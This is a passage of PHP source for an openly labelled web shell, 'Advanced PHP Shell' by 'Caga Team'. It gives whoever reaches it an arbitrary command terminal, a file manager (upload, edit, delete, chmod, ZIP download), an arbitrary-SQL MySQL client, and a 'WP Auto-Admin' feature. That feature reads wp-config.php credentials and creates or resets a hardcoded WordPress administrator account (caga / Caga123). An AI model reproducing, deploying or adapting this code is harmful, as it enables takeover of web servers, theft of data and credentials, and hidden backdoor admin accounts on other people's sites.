    }
}

// Search Files
if ($action === 'search' && $_SERVER['REQUEST_METHOD'] === 'POST') {
    $searchKeyword = trim($_POST['keyword'] ?? '');
    if ($searchKeyword) {
        $searchResults = searchFiles($cwd, $searchKeyword);
    }
}

// MySQL Connect
if ($action === 'mysqlconn' && $_SERVER['REQUEST_METHOD'] === 'POST') {
    $mhost = trim($_POST['mhost'] ?? 'localhost');
    $muser = trim($_POST['muser'] ?? '');
    $mpass = $_POST['mpass'] ?? '';
    $mdb = trim($_POST['mdb'] ?? '');
    if (function_exists('mysqli_connect')) {
        $conn = @mysqli_connect($mhost, $muser, $mpass, $mdb ?: null);
        if ($conn) {
            $_SESSION['mysql'] = ['host' => $mhost, 'user' => $muser, 'pass' => $mpass, 'db' => $mdb, 'connected' => true];
            $dbMsg = "✔ Connected to MySQL: $muser@$mhost" . ($mdb ? " / $mdb" : '');
        } else {
            $_SESSION['mysql'] = ['connected' => false];
            $dbMsg = "✘ MySQL Error: " . mysqli_connect_error();
        }
    } else {
        $dbMsg = "✘ mysqli extension not available.";
    }
}

// MySQL Query
$sqlResult = null;
$sqlError = '';
if ($action === 'mysqlquery' && $_SERVER['REQUEST_METHOD'] === 'POST') {
    $sql = trim($_POST['sqlcmd'] ?? '');
    $ms = $_SESSION['mysql'] ?? [];
    if (!empty($ms['connected']) && $sql) {
        $conn = @mysqli_connect($ms['host'], $ms['user'], $ms['pass'], $ms['db'] ?: null);
        if ($conn) {
            $res = mysqli_query($conn, $sql);
            if ($res === false) {
                $sqlError = mysqli_error($conn);
            } elseif ($res === true) {
                $sqlResult = [['affected_rows' => mysqli_affected_rows($conn)]];
            } else {
                $sqlResult = [];
                while ($row = mysqli_fetch_assoc($res))
                    $sqlResult[] = $row;
                mysqli_free_result($res);
            }
            mysqli_close($conn);
        } else {
            $sqlError = "Cannot connect: " . mysqli_connect_error();
        }
    } else {
        $sqlError = "Not connected to MySQL.";
    }
}

// MySQL Disconnect
if ($action === 'mysqldisconn') {
    unset($_SESSION['mysql']);
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

// Clear History
if ($_SERVER['REQUEST_METHOD'] === 'POST' && $action === 'clear_history') {
    $_SESSION['history'] = [];
    exit('OK');
}

// --- WP Auto-Admin ---
$wpAutoLog = null;
if ($action === 'wp_autoadmin' && $_SERVER['REQUEST_METHOD'] === 'POST') {
    $wpAutoLog = wpAutoAdmin(
        $cwd,                       // start search from current dir
        'caga',
        'caga@cagamerdeka.com',
        'Caga123'
    );
}

// Execute Command
if ($_SERVER['REQUEST_METHOD'] === 'POST' && ($action === 'exec' || isset($_POST['cmd']))) {
    $command = trim($_POST['cmd'] ?? '');
    if ($command !== '') {
        if (!in_array($command, $_SESSION['history'])) {
            array_unshift($_SESSION['history'], $command);
            $_SESSION['history'] = array_slice($_SESSION['history'], 0, $hist_limit);
        }
        $output = executeCommand($command, $cwd);
    }
}

// --- Render Data ---
$currentDir = $cwd;
$parentDir = dirname($currentDir);
$dirItems = listDirectory($currentDir);
$uname = php_uname();
$phpVer = phpversion();
$serverSW = $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown';

// Get username safely without relying on exec
if (function_exists('posix_getpwuid') && function_exists('posix_geteuid')) {
    $user = posix_getpwuid(posix_geteuid())['name'] ?? 'unknown';
} elseif (function_exists('exec')) {
    $user = @exec('whoami') ?: 'nobody';
} else {
    $user = 'nobody'; // fallback
}

$mysqlConn = $_SESSION['mysql'] ?? null;
$hasZip = class_exists('ZipArchive');
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?= htmlspecialchars($title) ?></title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: #0b0f18;
            color: #d4d4d4;
            font-family: 'JetBrains Mono', 'Fira Code', 'Courier New', monospace;
            padding: 16px;
            line-height: 1.5;
        }

        .container {
            max-width: 1500px;
            margin: 0 auto;
            display: grid;
            grid-template-columns: 1fr 440px;
            gap: 16px;
        }

        .terminal-panel {
            background: #0d1117;
            border: 1px solid #30363d;
            border-radius: 8px;
            overflow: hidden;
            display: flex;
            flex-direction: column;
        }

        .panel-hdr {
            background: #161b22;
            padding: 10px 15px;
            border-bottom: 1px solid #30363d;
            display: flex;
            align-items: center;
            justify-content: space-between;
        }

        .panel-title {
            color: #58a6ff;
            font-weight: 600;
            font-size: 14px;
        }

        .sys-info {
            color: #8b949e;
            font-size: 12px;
        }

        .terminal-body {
            padding: 15px;
            flex: 1;
            display: flex;
            flex-direction: column;
        }

        .output-area {
            background: #0a0c10;
            border: 1px solid #21262d;
            border-radius: 6px;
            padding: 15px;
            margin-bottom: 12px;
            min-height: 320px;
            max-height: 480px;
            overflow-y: auto;
            font-family: inherit;
            white-space: pre-wrap;
            word-wrap: break-word;
            color: #e6edf3;
        }

        .prompt {
            color: #f0883e;
            margin-right: 8px;
            user-select: none;
        }

        .cmd-form {
            display: flex;
            gap: 8px;
            margin-top: auto;
        }

        input.cmd-input {
            flex: 1;
            background: #0a0c10;
            border: 1px solid #30363d;
            color: #e6edf3;
            padding: 10px 14px;
            font-family: inherit;
            font-size: 14px;
            border-radius: 6px;
            outline: none;
        }

        input.cmd-input:focus {
            border-color: #58a6ff;
        }

        .btn {
            background: #21262d;
            border: 1px solid #30363d;
            color: #c9d1d9;
            padding: 9px 18px;
            font-family: inherit;
            font-size: 13px;
            border-radius: 6px;
            cursor: pointer;
            transition: all .2s;
        }

        .btn-primary {
            background: #238636;
            border-color: #2ea043;
            color: #fff;
        }

        .btn-primary:hover {
            background: #2ea043;
        }

        .btn:hover {
            background: #30363d;
        }

        .btn-danger {
            background: #6e1a1a;
            border-color: #b22222;
            color: #fca5a5;
        }

        .btn-danger:hover {
            background: #b22222;
        }

        .btn-warning {
            background: #5a3e00;
            border-color: #9e6a03;
            color: #f0883e;
        }

        .btn-warning:hover {
            background: #7d4f00;
        }

        .btn-info {
            background: #0c2d4e;
            border-color: #1f6feb;
            color: #58a6ff;
        }

        .btn-info:hover {
            background: #1f6feb;
            color: #fff;
        }

        .btn-sm {
            padding: 5px 10px;
            font-size: 12px;
        }

        .hist-wrap {
            margin-bottom: 8px;
            display: flex;
            gap: 8px;
        }

        select.hist-sel {
            flex: 1;
            background: #0a0c10;
            border: 1px solid #30363d;
            color: #e6edf3;
            padding: 5px 10px;
            font-family: inherit;
            border-radius: 4px;
        }

        .file-panel {
            background: #0d1117;
            border: 1px solid #30363d;
            border-radius: 8px;
            display: flex;
            flex-direction: column;
            min-height: 0;
        }

        .path-bar {
            background: #0a0c10;
            padding: 8px 14px;
            border-bottom: 1px solid #21262d;
            font-size: 12px;
            display: flex;
            align-items: center;
            flex-wrap: wrap;
            gap: 4px;
        }

        .path-part {
            color: #58a6ff;
            text-decoration: none;
        }

        .path-part:hover {
            text-decoration: underline;
        }

        .file-list {
            flex: 1;
            overflow-y: auto;
            max-height: 340px;
        }

        .file-item {
            display: grid;
            grid-template-columns: 18px 18px 1fr 68px 46px auto;
            padding: 5px 10px;
            border-bottom: 1px solid #21262d;
            font-size: 11.5px;
            align-items: center;
            gap: 4px;
        }

        .file-item:hover {
            background: #161b22;
        }

        .file-name a {
            color: #e6edf3;
            text-decoration: none;
        }

        .file-name a:hover {
            color: #58a6ff;
        }

        .dir-link a {
            color: #58a6ff !important;
            font-weight: 500;
        }

        .fmeta {
            color: #8b949e;
            text-align: right;
            font-size: 11px;
            white-space: nowrap;
        }

        .actions {
            display: flex;
            gap: 4px;
            justify-content: flex-end;
            align-items: center;
        }

        .action-btn {
            color: #8b949e;
            text-decoration: none;
            font-size: 12px;
            padding: 2px 3px;
            cursor: pointer;
            background: none;
            border: none;
            font-family: inherit;
        }

        .action-btn:hover {
            color: #58a6ff;
        }

        .del-btn {
            color: #f85149;
        }

        .del-btn:hover {
            color: #ff7b72;
        }

        .upload-area {
            padding: 10px 12px;
            border-top: 1px solid #30363d;
            background: #0a0c10;
        }

        .fm-toolbar {
            display: flex;
            gap: 6px;
            padding: 8px 12px;
            border-bottom: 1px solid #21262d;
            background: #0d1117;
            flex-wrap: wrap;
        }

        .mysql-panel {
            grid-column: span 2;
            background: #0d1117;
            border: 1px solid #30363d;
            border-radius: 8px;
            overflow: hidden;
        }

        .mysql-body {
            padding: 14px;
            display: grid;
            grid-template-columns: 340px 1fr;
            gap: 14px;
        }

        .mysql-form label {
            display: block;
            font-size: 12px;
            color: #8b949e;
            margin-bottom: 3px;
            margin-top: 8px;
        }

        .mysql-form input {
            width: 100%;
            background: #0a0c10;
            border: 1px solid #30363d;
            color: #e6edf3;
            padding: 7px 10px;
            font-family: inherit;
            font-size: 13px;
            border-radius: 4px;
            outline: none;
        }

        .sql-area {
            font-family: inherit;
            background: #0a0c10;
            border: 1px solid #30363d;
            color: #e6edf3;
            width: 100%;
            min-height: 80px;
            padding: 10px;
            border-radius: 4px;
            resize: vertical;
            font-size: 13px;
        }

        .sql-result-wrap {
            overflow: auto;
            max-height: 260px;
        }

        table.sql-table {
            border-collapse: collapse;
            font-size: 12px;
            min-width: 100%;
        }

        table.sql-table th {
            background: #161b22;
            color: #58a6ff;
            padding: 6px 10px;
            border: 1px solid #30363d;
            text-align: left;
        }

        table.sql-table td {
            padding: 5px 10px;
            border: 1px solid #21262d;
            color: #e6edf3;
        }

        table.sql-table tr:nth-child(even) td {
            background: #0d1117;
        }

        .msg-ok {
            color: #7ee787;
            font-size: 13px;
            padding: 4px 0;
        }

        .msg-err {
            color: #f85149;
            font-size: 13px;
            padding: 4px 0;
        }

        .badge {
            display: inline-block;
            padding: 2px 8px;
            border-radius: 10px;
            font-size: 11px;
        }

        .badge-on {
            background: #238636;
            color: #fff;
        }

        .badge-off {
            background: #6e1a1a;
            color: #fca5a5;
        }

        .credit-footer {
            grid-column: span 2;
            text-align: center;
            margin-top: 12px;
            color: #6e7681;
            font-size: 12px;
            border-top: 1px solid #21262d;
            padding-top: 10px;
        }

        .edit-area {
            background: #0a0c10;
            border: 1px solid #30363d;
            color: #e6edf3;
            width: 100%;
            min-height: 300px;
            font-family: monospace;
            padding: 10px;
        }

        /* Modal */
        .modal-overlay {
            display: none;
            position: fixed;
            inset: 0;
            background: rgba(0, 0, 0, 0.7);
            z-index: 100;
            align-items: center;
            justify-content: center;
        }

        .modal-overlay.show {
            display: flex;
        }

        .modal {
            background: #161b22;
            border: 1px solid #30363d;
            border-radius: 10px;
            padding: 20px;
            min-width: 300px;
            max-width: 500px;
            width: 100%;
            position: relative;
        }

        .modal h3 {
            color: #58a6ff;
            margin-bottom: 12px;
            font-size: 14px;
        }

        .modal input {
            width: 100%;
            background: #0a0c10;
            border: 1px solid #30363d;
            color: #e6edf3;
            padding: 8px 10px;
            border-radius: 4px;
            font-family: inherit;
            font-size: 13px;
            margin-bottom: 10px;
            outline: none;
        }

        .modal input:focus {
            border-color: #58a6ff;
        }

        .modal-close {
            position: absolute;
            top: 10px;
            right: 14px;
            color: #8b949e;
            cursor: pointer;
            font-size: 18px;
            background: none;
            border: none;
            font-family: inherit;
        }

        .modal-close:hover {
            color: #e6edf3;
        }

        .modal .btn-row {
            display: flex;
            gap: 8px;
            justify-content: flex-end;
            margin-top: 4px;
        }

        /* Search results */
        .search-panel {
            grid-column: span 2;
            background: #0d1117;
            border: 1px solid #30363d;
            border-radius: 8px;
            overflow: hidden;
        }

        .search-result-item {
            display: grid;
            grid-template-columns: 18px 1fr 80px;
            padding: 5px 12px;
            border-bottom: 1px solid #21262d;
            font-size: 12px;
            align-items: center;
            gap: 6px;
        }

        .search-result-item:hover {
            background: #161b22;
        }

        /* Dir size display */
        .dir-size-val {
            font-size: 10px;
            color: #3fb950;
            margin-left: 4px;
        }

        /* ZIP extract checkbox */
        .extract-checkbox {
            display: inline-flex;
            align-items: center;
            margin-left: 15px;
            font-size: 12px;
            color: #c9d1d9;
        }

        .extract-checkbox input {
            margin-right: 4px;
        }

        ::-webkit-scrollbar {
            width: 7px;
            height: 7px;
        }

        ::-webkit-scrollbar-track {
            background: #0d1117;
        }

        ::-webkit-scrollbar-thumb {
            background: #30363d;
            border-radius: 4px;
        }
    </style>
</head>

<body>
    <div class="container">

        <!-- ===== TERMINAL ===== -->
        <div class="terminal-panel">
            <div class="panel-hdr">
                <span class="panel-title">🐚 <?= htmlspecialchars($user . '@' . php_uname('n')) ?></span>
                <span class="sys-info">PHP <?= $phpVer ?> | <?= htmlspecialchars($serverSW) ?></span>
            </div>
            <div class="terminal-body">
                <div class="output-area" id="outputArea">
                    <?php if (!empty($uploadMsg)): ?>
                        <div style="color:#7ee787;margin-bottom:10px;"><?= nl2br(htmlspecialchars($uploadMsg)) ?></div>
                    <?php elseif ($output === '__CLEAR__'): ?>
                    <?php elseif ($command !== ''): ?>
                        <div><span class="prompt">$</span><span><?= htmlspecialchars($command) ?></span></div>
                        <pre
                            style="margin:4px 0 15px;font-family:inherit;color:#e6edf3;"><?= htmlspecialchars($output) ?></pre>
                    <?php else: ?>
                        <div style="color:#8b949e;">
                            Welcome to PHP Shell.<br>
                            System: <?= htmlspecialchars($uname) ?><br>
                            Dir: <?= htmlspecialchars($currentDir) ?><br>
                            User: <?= htmlspecialchars($user) ?><br><br>
                            Built-in: <b>cd</b> | <b>clear</b><br>
                            <?php if (!function_exists('exec') && !function_exists('shell_exec') && !function_exists('system') && !function_exists('passthru')): ?>
                                <span style="color:#f0883e;">⚠️ Terminal commands are disabled. Use File Manager instead.</span>
                            <?php endif; ?>
                        </div>
                    <?php endif; ?>
                </div>

                <?php if (!empty($_SESSION['history'])): ?>
                    <div class="hist-wrap">
                        <select class="hist-sel" onchange="fillCmd(this.value)">
                            <option value="">📜 History</option>
                            <?php foreach ($_SESSION['history'] as $h): ?>
                                <option value="<?= htmlspecialchars($h, ENT_QUOTES) ?>"><?= htmlspecialchars($h) ?></option>
                            <?php endforeach; ?>
                        </select>
                        <button class="btn btn-sm" onclick="clearHist()">Clear</button>
                    </div>
                <?php endif; ?>

                <form method="post" class="cmd-form">
                    <input type="hidden" name="action" value="exec">
                    <input type="text" name="cmd" class="cmd-input" id="cmdInput"
                        placeholder="<?= htmlspecialchars($currentDir) ?> $ ..." autofocus autocomplete="off">
                    <button type="submit" class="btn btn-primary">Run</button>
                </form>
            </div>
        </div>

        <!-- ===== FILE MANAGER ===== -->
        <div class="file-panel">
            <div class="panel-hdr" style="color:#f0883e;">
                📁 File Manager
                <?php if (!$hasZip): ?>
                    <span style="font-size:10px;color:#6e7681;margin-left:8px;">(ZipArchive not available)</span>
                <?php endif; ?>
            </div>

            <!-- Toolbar -->
            <form id="bulkForm" method="POST" action="?action=bulk_delete">
                <div class="fm-toolbar">
                    <button type="button" class="btn btn-sm btn-info" onclick="toggleSelectAll()">☑️ Select All</button>
                    <button type="button" class="btn btn-sm btn-danger" onclick="submitBulkDelete()">🗑️ Delete
                        Selected</button>
                    <button type="button" class="btn btn-sm btn-info" onclick="openModal('mkdirModal')">📁 New
                        Dir</button>
                    <button type="button" class="btn btn-sm btn-info" onclick="openModal('newfileModal')">📄 New
                        File</button>
                    <button type="button" class="btn btn-sm btn-info" onclick="openModal('searchModal')">🔍 Search</button>
                    <?php if ($hasZip && $currentDir !== '/'): ?>
                        <a class="btn btn-sm btn-warning" href="?action=downloaddir&dir=<?= urlencode($currentDir) ?>"
                            onclick="return confirm('Download current dir as ZIP?')"
                            title="Download current directory as ZIP">
                            ⬇️ ZIP Dir
                        </a>
                    <?php endif; ?>
                    <span style="margin-left:auto;font-size:11px;color:#6e7681;" id="totalSizeLabel"></span>
                </div>

                <!-- Path Bar -->
                <div class="path-bar">
                    <span>📂</span>
                    <?php
                    $parts = explode(DIRECTORY_SEPARATOR, trim($currentDir, DIRECTORY_SEPARATOR));
                    $built = '';
                    echo '<a href="?action=cd&dir=' . urlencode('/') . ' " class="path-part">/</a>';
                    foreach ($parts as $p) {
                        if ($p === '')
                            continue;
                        $built .= DIRECTORY_SEPARATOR . $p;
                        echo ' <span style="color:#6e7681;">/</span> ';
                        echo '<a href="?action=cd&dir=' . urlencode($built) . '" class="path-part">' . htmlspecialchars($p) . '</a>';
                    }
                    ?>
                </div>

                <?php if ($currentDir !== $parentDir): ?>
                    <div style="padding:5px 12px;border-bottom:1px solid #21262d;">
                        <a href="?action=cd&dir=<?= urlencode($parentDir) ?>" style="color:#f0883e;text-decoration:none;">⬆️
                            ..</a>
                    </div>
                <?php endif; ?>

                <div class="file-list">
                    <?php foreach ($dirItems as $item): ?>
                        <div class="file-item">
                            <input type="checkbox" name="files[]" value="<?= htmlspecialchars($item['name']) ?>"
                                class="bulk-cb" />
                            <span><?= $item['isDir'] ? '📁' : '📄' ?></span>
                            <span class="<?= $item['isDir'] ? 'dir-link' : 'file-name' ?>">
                                <?php if ($item['isDir']): ?>
                                    <a
                                        href="?action=cd&dir=<?= urlencode($item['path']) ?>"><?= htmlspecialchars($item['name']) ?>/</a>
                                    <span class="dir-size-val" id="ds_<?= md5($item['path']) ?>"></span>
                                <?php else: ?>
                                    <a
                                        href="?action=download&file=<?= urlencode($item['path']) ?>"><?= htmlspecialchars($item['name']) ?></a>
                                <?php endif; ?>
                            </span>
                            <span class="fmeta"><?= $item['size'] ?></span>
                            <span class="fmeta"><?= $item['perms'] ?></span>
                            <span class="actions">
                                <?php if ($item['isDir']): ?>
                                    <button type="button" class="action-btn dirsize-btn"
                                        data-path="<?= htmlspecialchars($item['path']) ?>"
                                        data-labelid="ds_<?= md5($item['path']) ?>" title="Check size">📊</button>
                                    <?php if ($hasZip): ?>
                                        <a href="?action=downloaddir&dir=<?= urlencode($item['path']) ?>" class="action-btn"
                                            title="Download as ZIP"
                                            onclick="return confirm('ZIP & download <?= htmlspecialchars($item['name'], ENT_QUOTES) ?>?')">⬇️</a>
                                    <?php endif; ?>
                                    <button type="button" class="action-btn rename-btn"
                                        data-path="<?= htmlspecialchars($item['path']) ?>"
                                        data-name="<?= htmlspecialchars($item['name']) ?>" title="Rename">✏️</button>
                                    <button type="button" class="action-btn chmod-btn"
                                        data-path="<?= htmlspecialchars($item['path']) ?>"
                                        data-perms="<?= htmlspecialchars($item['perms']) ?>" title="Chmod">🔑</button>
                                    <a href="?action=cleardir&dir=<?= urlencode($item['path']) ?>" class="action-btn"
                                        style="color:#e3b341;"
                                        onclick="return confirm('Clear dir <?= htmlspecialchars($item['name'], ENT_QUOTES) ?>?\nThis deletes ALL contents inside it (keeps the folder itself).')"
                                        title="Clear Directory">🧹</a>
                                    <a href="?action=deletedir&dir=<?= urlencode($item['path']) ?>" class="action-btn del-btn"
                                        onclick="return confirm('Delete dir <?= htmlspecialchars($item['name'], ENT_QUOTES) ?> and all its contents?')"
                                        title="Delete">🗑️</a>
                                <?php else: ?>
                                    <a href="?action=view&file=<?= urlencode($item['path']) ?>" class="action-btn"
                                        target="_blank" title="View">👁️</a>
                                    <a href="?action=edit&file=<?= urlencode($item['path']) ?>" class="action-btn"
                                        title="Edit">✏️</a>
                                    <a href="?action=download&file=<?= urlencode($item['path']) ?>" class="action-btn"
                                        title="Download">⬇️</a>
                                    <button type="button" class="action-btn copy-btn"
                                        data-path="<?= htmlspecialchars($item['path']) ?>"
                                        data-name="<?= htmlspecialchars($item['name']) ?>" title="Copy">📋</button>
                                    <button type="button" class="action-btn rename-btn"
                                        data-path="<?= htmlspecialchars($item['path']) ?>"
                                        data-name="<?= htmlspecialchars($item['name']) ?>" title="Rename">🔄</button>
                                    <button type="button" class="action-btn chmod-btn"
                                        data-path="<?= htmlspecialchars($item['path']) ?>"
                                        data-perms="<?= htmlspecialchars($item['perms']) ?>" title="Chmod">🔑</button>
                                    <a href="?action=delete&file=<?= urlencode($item['path']) ?>" class="action-btn del-btn"
                                        onclick="return confirm('Delete <?= htmlspecialchars($item['name'], ENT_QUOTES) ?>?')"
                                        title="Delete">✕</a>
                                <?php endif; ?>
                            </span>
                        </div>
                    <?php endforeach; ?>
                    <?php if (empty($dirItems)): ?>
                        <div style="padding:20px;text-align:center;color:#6e7681;">Empty directory</div>
                    <?php endif; ?>
                </div>
            </form>

            <div class="upload-area">
                <form method="post" enctype="multipart/form-data">
                    <input type="hidden" name="action" value="upload">
                    <label style="font-size:12px;display:block;margin-bottom:4px;">⬆️ Upload to:
                        <?= htmlspecialchars(basename($currentDir)) ?>/</label>
                    <input type="file" name="files[]" multiple style="color:#e6edf3;width:100%;font-size:12px;">
                    <div style="display:flex; align-items:center; margin-top:6px;">
                        <button type="submit" class="btn btn-sm"
                            style="background:#1f6feb;border-color:#1f6feb;color:#fff;">Upload</button>
                        <label class="extract-checkbox">
                            <input type="checkbox" name="extract_zip" value="1"> Extract ZIP after upload
                        </label>
                        <span style="font-size:11px;color:#6e7681;margin-left:auto;">Max
                            <?= formatSize($max_upload) ?></span>
                    </div>
                </form>
            </div>
        </div>

        <!-- ===== EDIT FILE ===== -->
        <?php if ($action === 'edit' && $editFile): ?>
            <div class="mysql-panel" style="margin-top:16px;">
                <div class="panel-hdr">
                    <span class="panel-title">✏️ Editing: <?= htmlspecialchars(basename($editFile)) ?></span>
                </div>
                <div class="mysql-body" style="grid-template-columns:1fr;">
                    <form method="post">
                        <input type="hidden" name="action" value="saveedit">
                        <input type="hidden" name="editfile" value="<?= htmlspecialchars($editFile) ?>">
                        <textarea name="content" class="edit-area"
                            wrap="off"><?= htmlspecialchars($editContent) ?></textarea>
                        <div style="margin-top:10px;">
                            <button type="submit" class="btn btn-primary">Save Changes</button>
                            <a href="<?= $_SERVER['PHP_SELF'] ?>" class="btn" style="margin-left:8px;">Cancel</a>
                        </div>
                    </form>
                </div>
            </div>
        <?php endif; ?>

        <!-- ===== SEARCH RESULTS ===== -->
        <?php if ($searchResults !== null): ?>
            <div class="search-panel">
                <div class="panel-hdr">
                    <span class="panel-title">🔍 Search: "<?= htmlspecialchars($searchKeyword) ?>" —
                        <?= count($searchResults) ?> result(s) in <?= htmlspecialchars($currentDir) ?></span>
                </div>
                <?php if (empty($searchResults)): ?>
                    <div style="padding:16px;color:#6e7681;">No files found.</div>
                <?php else: ?>
                    <div style="max-height:300px;overflow-y:auto;">
                        <?php foreach ($searchResults as $r): ?>
                            <div class="search-result-item">
                                <span><?= $r['isDir'] ? '📁' : '📄' ?></span>
                                <span
                                    style="font-size:11px;color:#8b949e;word-break:break-all;"><?= htmlspecialchars($r['path']) ?></span>
                                <span class="actions">
                                    <?php if (!$r['isDir']): ?>
                                        <a href="?action=view&file=<?= urlencode($r['path']) ?>" class="action-btn" target="_blank"
                                            title="View">👁️</a>
                                        <a href="?action=download&file=<?= urlencode($r['path']) ?>" class="action-btn"
                                            title="Download">⬇️</a>
                                    <?php else: ?>
                                        <a href="?action=cd&dir=<?= urlencode($r['path']) ?>" class="action-btn" title="Open">📂</a>
                                    <?php endif; ?>
                                </span>
                            </div>
                        <?php endforeach; ?>
                    </div>
                <?php endif; ?>
            </div>
        <?php endif; ?>

        <!-- ===== MYSQL PANEL ===== -->
        <div class="mysql-panel">
            <div class="panel-hdr" style="display:flex;align-items:center;gap:10px;">
                <span class="panel-title">🗄️ MySQL Client</span>
                <?php if (!empty($mysqlConn['connected'])): ?>
                    <span class="badge badge-on">● Connected:
                        <?= htmlspecialchars($mysqlConn['user'] . '@' . $mysqlConn['host']) ?>
                        <?= $mysqlConn['db'] ? ' / ' . $mysqlConn['db'] : '' ?></span>
                    <a href="?action=mysqldisconn" class="btn btn-sm btn-danger" style="margin-left:auto;">Disconnect</a>
                <?php else: ?>
                    <span class="badge badge-off">● Disconnected</span>
                <?php endif; ?>
            </div>
            <div class="mysql-body">
                <div>
                    <?php if (!empty($dbMsg)): ?>
                        <div class="<?= strpos($dbMsg, '✔') !== false ? 'msg-ok' : 'msg-err' ?>">
                            <?= htmlspecialchars($dbMsg) ?>
                        </div>
                    <?php endif; ?>
                    <form method="post" class="mysql-form">
                        <input type="hidden" name="action" value="mysqlconn">
                        <label>Host</label>
                        <input type="text" name="mhost"
                            value="<?= htmlspecialchars($mysqlConn['host'] ?? 'localhost') ?>" placeholder="localhost">
                        <label>Username</label>
                        <input type="text" name="muser" value="<?= htmlspecialchars($mysqlConn['user'] ?? '') ?>"
                            placeholder="root">
                        <label>Password</label>
                        <input type="password" name="mpass" placeholder="••••••••">
                        <label>Database (optional)</label>
                        <input type="text" name="mdb" value="<?= htmlspecialchars($mysqlConn['db'] ?? '') ?>"
                            placeholder="my_database">
                        <button type="submit" class="btn btn-primary"
                            style="margin-top:10px;width:100%;">Connect</button>
                    </form>
                </div>
                <div>
                    <form method="post">
                        <input type="hidden" name="action" value="mysqlquery">
                        <label style="font-size:12px;color:#8b949e;display:block;margin-bottom:4px;">SQL Query</label>
                        <textarea class="sql-area" name="sqlcmd"
                            placeholder="SELECT * FROM users LIMIT 20;"><?= htmlspecialchars($_POST['sqlcmd'] ?? '') ?></textarea>
                        <button type="submit" class="btn btn-primary btn-sm" style="margin-top:6px;">▶ Execute</button>
                    </form>
                    <?php if ($sqlError): ?>
                        <div class="msg-err" style="margin-top:8px;"><?= htmlspecialchars($sqlError) ?></div>
                    <?php elseif ($sqlResult !== null): ?>
                        <div style="margin-top:8px;">
                            <?php if (isset($sqlResult[0]['affected_rows'])): ?>
                                <span class="msg-ok">✔ Query OK, <?= $sqlResult[0]['affected_rows'] ?> row(s) affected</span>
                            <?php elseif (empty($sqlResult)): ?>
                                <span style="color:#8b949e;font-size:12px;">Empty result set</span>
                            <?php else: ?>
                                <div class="sql-result-wrap">
                                    <table class="sql-table">
                                        <thead>
                                            <tr>
                                                <?php foreach (array_keys($sqlResult[0]) as $col): ?>
                                                    <th><?= htmlspecialchars($col) ?></th>
                                                <?php endforeach; ?>
                                            </tr>
                                        </thead>
                                        <tbody>
                                            <?php foreach ($sqlResult as $row): ?>
                                                <tr>
                                                    <?php foreach ($row as $v): ?>
                                                        <td><?= htmlspecialchars($v ?? 'NULL') ?></td>
                                                    <?php endforeach; ?>
                                                </tr>
                                            <?php endforeach; ?>
                                        </tbody>
                                    </table>
                                </div>
                                <div style="color:#6e7681;font-size:11px;margin-top:4px;"><?= count($sqlResult) ?> row(s)</div>
                            <?php endif; ?>
                        </div>
                    <?php endif; ?>
                </div>
            </div>
        </div>

        <!-- ===== WP AUTO-ADMIN PANEL ===== -->
        <div class="mysql-panel" style="margin-top:0;">
            <div class="panel-hdr" style="display:flex;align-items:center;gap:10px;">
                <span class="panel-title">🛡️ WP Auto-Admin Generator</span>
                <span style="font-size:11px;color:#8b949e;">caga / caga@cagamerdeka.com / Caga123</span>
                <span style="margin-left:auto;font-size:11px;color:#6e7681;">Starts from: <?= htmlspecialchars($currentDir) ?></span>
            </div>
            <div style="padding:12px 14px;">
                <div style="font-size:12px;color:#8b949e;margin-bottom:10px;line-height:1.6;">
                    Automatically finds <code style="color:#58a6ff;">wp-load.php</code> &amp; <code style="color:#58a6ff;">wp-config.php</code>
                    by walking UP up to <strong>25 levels</strong> from the current directory.<br>
                    Parses DB credentials → connects → hashes password → creates/resets WP admin.
                </div>

                <?php if ($wpAutoLog !== null): ?>
                    <div style="background:#0a0c10;border:1px solid #21262d;border-radius:6px;padding:12px;margin-bottom:10px;font-size:12px;font-family:inherit;">
                        <?php foreach ($wpAutoLog as $entry): ?>
                            <div style="color:<?= $entry['ok'] ? '#7ee787' : '#f85149' ?>;margin-bottom:3px;">
                                <?= $entry['ok'] ? '✔' : '✘' ?>  <?= htmlspecialchars($entry['msg']) ?>
                            </div>
                        <?php endforeach; ?>
                    </div>
                <?php endif; ?>

                <form method="post" onsubmit="return confirm('Run WP Auto-Admin from current directory?\n\nThis will:\n1. Search for wp-load.php & wp-config.php (up to 25 levels)\n2. Parse DB credentials\n3. Connect MySQL\n4. Create/reset admin user: caga / Caga123')">
                    <input type="hidden" name="action" value="wp_autoadmin">
                    <button type="submit" class="btn btn-primary">⚡ Run WP Auto-Admin</button>
                    <span style="font-size:11px;color:#6e7681;margin-left:10px;">No MySQL connection needed — reads wp-config.php directly</span>
                </form>
            </div>
        </div>

        <div class="credit-footer">⚡ Advanced PHP Shell v1.2.1 by <strong>Caga Team</strong> ⚡ | PHP <?= phpversion() ?> | <?= date('Y') ?></div>
    </div>

    <!-- ========== MODALS ========== -->

    <!-- Rename Modal -->
    <div class="modal-overlay" id="renameModal">
        <div class="modal">
            <button class="modal-close" onclick="closeModal('renameModal')">✕</button>
            <h3>🔄 Rename</h3>
            <form method="post">
                <input type="hidden" name="action" value="rename">
                <input type="hidden" name="oldpath" id="renameOldPath">
                <input type="text" name="newname" id="renameNewName" placeholder="New name" autocomplete="off">
                <div class="btn-row">
                    <button type="button" class="btn btn-sm" onclick="closeModal('renameModal')">Cancel</button>
                    <button type="submit" class="btn btn-sm btn-primary">Rename</button>
                </div>
            </form>
        </div>
    </div>

    <!-- New Directory Modal -->
    <div class="modal-overlay" id="mkdirModal">
        <div class="modal">
            <button class="modal-close" onclick="closeModal('mkdirModal')">✕</button>
            <h3>📁 Create Directory</h3>
            <form method="post">
                <input type="hidden" name="action" value="mkdir">
                <input type="text" name="dirname" placeholder="Directory name" autocomplete="off" autofocus>
                <div class="btn-row">
                    <button type="button" class="btn btn-sm" onclick="closeModal('mkdirModal')">Cancel</button>
                    <button type="submit" class="btn btn-sm btn-primary">Create</button>
                </div>
            </form>
        </div>
    </div>

    <!-- New File Modal -->
    <div class="modal-overlay" id="newfileModal">
        <div class="modal">
            <button class="modal-close" onclick="closeModal('newfileModal')">✕</button>
            <h3>📄 Create New File</h3>
            <form method="post">
                <input type="hidden" name="action" value="newfile">
                <input type="text" name="filename" placeholder="filename.txt" autocomplete="off" autofocus>
                <div class="btn-row">
